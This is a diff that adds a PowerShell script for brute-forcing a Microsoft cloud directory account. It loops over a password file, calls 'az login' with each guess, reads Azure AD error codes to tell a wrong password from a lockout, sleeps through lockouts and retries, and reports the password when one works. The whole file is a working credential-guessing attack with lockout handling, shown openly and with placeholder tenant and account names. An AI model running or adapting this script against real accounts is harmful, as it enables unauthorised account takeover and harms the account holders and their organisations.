@@ -1,0 +1,35 @@
+# Timeout in seconds to wait on account lockout
+$timeout = 61
+$account_name = "<account_name>@<directory>.onmicrosoft.com"
+
+# Get password list from file
+[string[]]$passwords = Get-Content -Path passwords.txt
+
+for ( $i = 0; $i -lt $passwords.Length; $i++ ) {
+    $password = $passwords[$i]
+    echo "Trying password $password"
+
+    # Try to login with the password
+    $signed_in = (az login --tenant "<Tenant Name>" -u "`"${account_name}`"" -p "`"${password}`"" --allow-no-subscriptions 2>&1)
+
+    # Check for locked out error code
+    if ($signed_in -like '*AADSTS50053*') {
+        echo "Account is locked!"
+
+        # Wait for timeout
+        Start-Sleep -Seconds $timeout
+
+        # Retry last tried password, since account was locked
+        $i--
+    }
+    # Check for wrong password error code
+    elseif ($signed_in -like '*AADSTS50126*') {
+        echo "Wrong password!"
+    }
+    # Else the password is found!
+    else {
+        echo "Password found: $($password)"
+        break
+    }
+}
+
